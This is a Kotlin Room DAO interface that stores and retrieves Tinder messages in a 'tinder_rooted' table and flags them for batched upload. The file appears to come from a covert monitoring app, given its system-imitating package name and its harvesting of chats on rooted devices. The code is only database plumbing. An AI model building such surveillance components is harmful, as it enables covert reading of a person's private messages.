package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.TinderRooted
import com.android.services.util.AppConstants
import java.util.*

@Dao
interface TinderRootedDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(TinderRooted: List<TinderRooted>)

    @Query("Select * from tinder_rooted where status =:status ORDER BY date DESC limit ${AppConstants.imLogsUploadLimit}")
    fun selectAllTinderMessages(status: Int): List<TinderRooted>

    @Query("Update tinder_rooted set status=:updated_status where message_date BETWEEN :startDate AND :endDate")
    fun update(updated_status: Int, startDate: Date, endDate: Date): Int

    @Query("select max(timeStamp) from tinder_rooted")
    fun selectMaxTimeStamp(): Long?
}